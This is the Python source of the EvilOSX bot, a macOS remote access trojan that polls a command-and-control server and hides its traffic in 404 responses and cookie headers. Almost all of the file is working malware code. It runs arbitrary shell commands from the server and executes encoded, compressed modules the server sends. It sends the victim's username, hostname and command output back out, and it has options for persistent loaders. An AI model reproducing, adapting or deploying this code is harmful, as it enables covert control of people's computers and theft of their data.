#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Minimal bot which loads modules as they are needed from the server."""
__author__ = "Marten4n6"
__license__ = "GPLv3"
__version__ = "4.1.1"

import getpass
import json
import logging
import os
import subprocess
from threading import Timer, Thread
import traceback
import uuid
from base64 import b64encode, b64decode
from binascii import hexlify
from time import sleep, time
from zlib import decompress
import platform
from StringIO import StringIO
from urllib import urlencode
import sys
import binascii

import urllib2

# *************************************************************
# These variables will be patched when this payload is created.
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 1337
USER_AGENT = ""
PROGRAM_DIRECTORY = ""
LOADER_OPTIONS = {"loader_name": "launch_daemon"}
# *************************************************************

COMMAND_INTERVAL = 1  # Normal interval to check for commands.
IDLE_INTERVAL = 30  # Interval to check for commands when idle.
IDLE_TIME = 60  # Time in seconds after which the client will become idle.
IDLE_SLEEP_INTERVAL = 5 # Time between sleeps

# Logging
logging.basicConfig(format="[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s", level=logging.DEBUG)
log = logging.getLogger(__name__)


class CommandType:
    """Enum class for command types."""

    def __init__(self):
        pass

    NONE = 0
    MODULE = 1
    SHELL = 2


class RequestType:
    """Enum class for bot request types."""

    def __init__(self):
        pass

    GET_COMMAND = 1
    RESPONSE = 2


class Command:
    """This class represents a command."""

    def __init__(self, command_type, command=None, options=None):
        """
        :type command_type: int
        :type command: str
        :type options: dict
        """
        self.type = command_type
        self.command = command
        self.options = options


def get_uid():
    """:return The unique ID of this bot."""
    # The bot must be connected to WiFi anyway, so getnode is fine.
    # See https://docs.python.org/2/library/uuid.html#uuid.getnode
    return hexlify(getpass.getuser() + "-" + str(uuid.getnode()) + "-" + __version__)


def run_command(command, cleanup=True, kill_on_timeout=True):
    """Runs a system command and returns its response."""
    if len(command) > 3 and command[0:3] == "cd ":
        try:
            os.chdir(os.path.expanduser(command[3:]))
            return "Directory changed to: " + os.getcwd()
        except Exception as ex:
            log.error(str(ex))
            return str(ex)
    else:
        try:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            timer = None

            try:
                if kill_on_timeout:
                    # Kill process after 5 seconds (in case it hangs).
                    timer = Timer(5, lambda process: process.kill(), [process])
                    timer.start()

                stdout, stderr = process.communicate()
                response = stdout + stderr

                if cleanup:
                    return response.replace("\n", "")
                else:
                    if len(response.split("\n")) == 2:  # Response is one line.
                        return response.replace("\n", "")
                    else:
                        return response
            finally:
                if timer:
                    timer.cancel()
        except Exception as ex:
            log.error(str(ex))
            return str(ex)


class ModuleTask(Thread):
    """This class handles the execution of a module.

    Thread subclass with a kill method, see:
    https://mail.python.org/pipermail/python-list/2004-May/281944.html
    """

    def __init__(self, command):
        Thread.__init__(self)
        self._command = command
        self._is_killed = False

    def write(self, text):
        """This is the where sys.stdout is redirected to."""
        if text != "\n":
            module_name = self._command.options["module_name"]
            response_options = ""

            if "response_options" in self._command.options:
                response_options = self._command.options["response_options"]

            send_response(text, module_name, response_options)

    def run(self):
        sys.stdout = self
        sys.settrace(self.global_trace)

        # The module code is encoded with base64 and compressed.
        try:
            module = compile(decompress(b64decode(self._command.command)), "<string>", "exec")
        except binascii.Error:
            send_response("Could not decode string as Base64 (len:%s).\n" % len(self._command.command))

        module_dict = {}

        # We want every module to be able to access these options.
        self._command.options["server_host"] = SERVER_HOST
        self._command.options["server_port"] = SERVER_PORT
        self._command.options["program_directory"] = PROGRAM_DIRECTORY
        self._command.options["loader_options"] = LOADER_OPTIONS

        try:
            exec(module, module_dict)
            module_dict["run"](self._command.options)  # Thanks http://lucumr.pocoo.org/2011/2/1/exec-in-python/
        except Exception:
            send_response("Error executing module: \n" + traceback.format_exc())

        sys.stdout = sys.__stdout__

    def global_trace(self, frame, why, arg):
        if why == "call":
            return self.local_trace
        else:
            return None

    def local_trace(self, frame, why, arg):
        if self._is_killed:
            if why.strip() == "line":
                raise SystemExit()
        return self.local_trace

    def kill(self):
        self._is_killed = True


def send_response(response, module_name="", response_options=""):
    """Sends a response to the server.

    :type response: str
    :type module_name: str
    :type response_options: dict
    """
    headers = {"User-Agent": USER_AGENT}
    data = urlencode({"username": b64encode(json.dumps(
        {"response": b64encode(response),
         "bot_uid": get_uid(), "module_name": module_name, "response_options": response_options}
    ))})

    try:
        request = urllib2.Request("http://%s:%s" % (SERVER_HOST, SERVER_PORT), headers=headers, data=data)
        urllib2.urlopen(request)
    except urllib2.HTTPError as ex:
        if ex.code == 404:
            # 404 response expected, no problem.
            pass
        else:
            raise


def get_command():
    """
    :return: A command from the server.
    :rtype: Command
    """
    headers = {
        "User-Agent": USER_AGENT,
        "Cookie": "session=" + b64encode(get_uid()) + "-" +
                  b64encode(json.dumps({
                      "type": RequestType.GET_COMMAND, "username": run_command("whoami"),
                      "hostname": run_command("hostname"), "path": run_command("pwd"),
                      "version": str(platform.mac_ver()[0]), "loader_name": LOADER_OPTIONS["loader_name"]
        }))
    }
    response = ""

    try:
        # This will always throw an exception because the server will respond with 404.
        urllib2.urlopen(urllib2.Request("http://%s:%s" % (SERVER_HOST, SERVER_PORT), headers=headers))
    except urllib2.HTTPError as ex:
        if ex.code == 404:
            response = ex.read()

            log.debug("Raw response: \n" + response)
        else:
            log.error(ex.message)

    try:
        processed = response.split("DEBUG:\n")[1].replace("DEBUG-->", "")
        try:
            processed_split = b64decode(processed).split("\n")
        except binascii.Error:
            return Command(CommandType.NONE)

        command_type = int(processed_split[0])
        command = processed_split[1]
        try:
            options = json.loads(b64decode(processed_split[2]))
        except ValueError:
            # This command isn't a module so there's no options.
            options = None

        log.debug("Type: " + str(command_type))
        log.debug("Command: " + command)
        log.debug("Options: " + str(options))

        return Command(command_type, command, options)
    except IndexError:
        return Command(CommandType.NONE)


def main():
    """Main bot loop."""
    last_active = time()  # The last time a command was requested from the server.
    idle = False

    log.info("Starting EvilOSX v%s...", __version__)

    while True:
        try:
            log.info("Receiving command...")
            command = get_command()

            if command.type != CommandType.NONE:
                if idle:
                    log.info("Switching from idle back to normal mode...")

                last_active = time()
                idle = False

                if command.type == CommandType.MODULE:
                    log.debug("Running module...")

                    module_task = ModuleTask(command)
                    module_task.daemon = True
                    module_task.start()
                else:
                    log.debug("Running command...")
                    send_response(run_command(b64decode(command.command), cleanup=False))
            else:
                log.info("No command received.")

                if idle:
                    sleep(IDLE_INTERVAL)
                elif (time() - last_active) >= IDLE_TIME:
                    log.info("The last command was a while ago, switching to idle...")
                    idle = True
                else:
                    sleep(COMMAND_INTERVAL)
        except Exception as ex:
            if "Connection refused" in str(ex):
                # The server is offline.
                log.error("Failed to connect to the server.")
                sleep(IDLE_SLEEP_INTERVAL)
            else:
                log.error(traceback.format_exc())
                sleep(IDLE_SLEEP_INTERVAL)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        log.info("\nInterrupted.")
